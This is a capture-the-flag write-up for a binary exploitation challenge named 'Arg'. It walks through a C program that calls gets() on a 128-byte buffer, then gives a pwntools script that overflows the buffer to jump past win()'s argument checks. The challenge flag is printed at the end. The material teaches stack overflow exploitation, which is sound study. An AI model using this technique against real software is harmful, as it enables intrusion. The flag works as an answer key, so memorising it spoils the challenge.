# Arg
---

### Challenge Description

Specific arguments... Seems easy

nc challenge2.lagncrash.com 10001

[Args.zip](https://github.com/caprinux/LagNCrash/files/6129814/Args.zip)

---

### Solution

So we are given the ELF binary and the source code. Checking the binary, we get:

```
$ pwn checksec argssource

[*] '/media/sf_Kali_Linux/argssource'

    Arch:     amd64-64-little

    RELRO:    Partial RELRO

    Stack:    No canary found

    NX:       NX enabled

    PIE:      No PIE (0x400000)

```

Opening the source code, we get: 

```C
#include <stdio.h>
#include <unistd.h>
int main(int argc, char** argv){
	setvbuf(stdout, NULL, _IONBF, 0);
	vuln();
}

int vuln(void){
	char buf[128];
	gets(buf);
	return 0;
}

int win(long a, long b, long c){
	if(!(a == 0xdeadbeef)) return 1;
	if(!(b == 0xcafebabecafebabe)) return 1;
	if(!(c == 0xd00df00dd00df00d)) return 1;

	char buf[64];
	FILE *f = fopen("flag.txt","r");
	if (f == NULL) {
	printf("Run this on the server.\n");
	exit(0);
	}

	fgets(buf,64,f);
	printf(buf);

	return 0;	
}
```

As you can see, from the checksec, this file does not have a canary unlike Baby, but NX is enabled. 

We go on to read the source code, we see that the executable goes from the main() to the vuln() and takes an input with the gets call, but buffer only holds 128 bytes of input, then it returns.

We can get our flag and win if we can make it such that the return address returns the function to the win() address.

However, since this has NX enabled, and possibly even ASLR, returning to stack memory won't really work.

Rather, we can write to bss segment, which is writable uninitialised data, and then from there put the win address to obtain the flag.

To obtain the address of the bss segment, we can run the following command

```
$ objdump -x argssource | grep bss
 24 .bss          00000010  0000000000601070  0000000000601070  00001070  2**4

0000000000601070 l    d  .bss	0000000000000000              .bss

0000000000601078 l     O .bss	0000000000000001              completed.6982

0000000000601070 g     O .bss	0000000000000008              stdout@@GLIBC_2.2.5

0000000000601080 g       .bss	0000000000000000              _end

0000000000601070 g       .bss	0000000000000000              __bss_start
```
Here, we get some address of bss functions, but I wasn't sure whether to write to the start or the end. Hence, I trial and error with both __bss_start and _end .

Opening the argssource file with Ghidra, we go to the win function and we can see the address. We skip all the parameter checks and copy the address of the win function right before flag.txt is opened.

win_addr_before_fopen = 0x00000000004007c8

Now that we have everything, we can craft our exploit.

```
from pwn import *

win_addr_before_fread = 0x00000000004007c8
vuln_offset = 128
bss_segment = 0x0000000000601080

payload = b"A" * vuln_offset + p64(bss_segment) + p64(win_addr_before_fread)
p = remote('challenge2.lagncrash.com', 10001)
p.sendline(payload)
print(p.recv())
```

We obtain the flag.

```
LNC{C5U_H4V3_7H3_GADGETS}
```

_p.s. this was probably not the intended way of solving args but welp_

